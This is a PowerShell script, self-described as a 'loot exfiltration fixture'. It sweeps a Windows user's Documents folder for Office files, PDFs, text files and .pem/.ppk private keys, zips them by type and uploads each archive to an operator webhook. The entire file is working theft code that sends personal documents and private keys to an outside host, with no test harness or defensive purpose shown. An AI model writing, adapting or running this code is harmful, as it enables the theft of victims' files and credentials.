# Staged loot exfiltration fixture: sweeps user documents and private keys,
# stages each kind into its own archive, and uploads every archive plus a
# JSON status post to an operator webhook held in $endpointUrl.
function Send-Loot {
    param(
        [string]$archive,
        [string]$note
    )

    $payload = @{
        'username' = $env:COMPUTERNAME
        'content' = $note
    }

    if (-not ([string]::IsNullOrEmpty($note))) {
        Invoke-RestMethod -Uri $endpointUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'
    }

    if (-not ([string]::IsNullOrEmpty($archive))) {
        curl.exe -F "upload=@$archive" $endpointUrl
    }
}

$hits = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Include "*.docx","*.xlsx","*.pdf","*.txt","*.pem","*.ppk" -Recurse

$kinds = @{
    "*.docx" = "word";
    "*.xlsx" = "sheets";
    "*.pdf" = "pdf";
    "*.txt" = "text";
    "*.pem" = "keys";
    "*.ppk" = "keys";
}

foreach ($kind in $kinds.Keys) {
    $batch = $hits | Where-Object { $_.Name -like $kind }

    if ($batch) {
        $bundle = "$env:TEMP\$($kinds[$kind]).zip"

        $batch | Compress-Archive -DestinationPath $bundle -Force

        Send-Loot -archive $bundle -note "Uploading $($kinds[$kind]) files"
    }
}
